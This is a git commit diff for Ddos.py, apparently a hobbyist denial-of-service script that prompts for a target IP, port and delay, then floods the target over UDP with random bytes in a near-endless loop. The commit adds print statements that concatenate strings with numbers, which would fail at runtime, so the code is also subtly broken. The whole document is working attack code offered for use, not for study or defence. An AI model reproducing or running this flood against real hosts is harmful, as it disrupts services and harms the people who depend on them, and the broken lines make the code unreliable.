8cdb50e88ed18cacd6b01087142af3e49ffeb170
2knn10 <109735963+2knn10@users.noreply.github.com>
2022-10-13 09:55:30 +0300

    Update Ddos.py

--- Ddos.py
+++ Ddos.py
@@ -16,15 +16,20 @@ print('''
 |      [ + ] Telegram : https://t.me/kavani2knn10 |                   
 |=================================================| 
 ''')
+
+
 s = socket.socket (socket .AF_INET, socket. SOCK_DGRAM)
 
 ip = input ("Enter Target IP : ")
+print(""+ip)
 port = int (input ("Enter Target Port : "))
+print(""+port)
 sleep = float(input ("Sleep : "))
+print(""+sleep)
 
 s.connect((ip,port))
 
-for i in range(1, 100**1000):
-    s. send(random._urandom (10)*1000)
+for i in range(1, 1000**1000):
+    s.send(random._urandom (10)*1000)
     print(f"Send: {i}", end='\r')
     time.sleep(sleep)
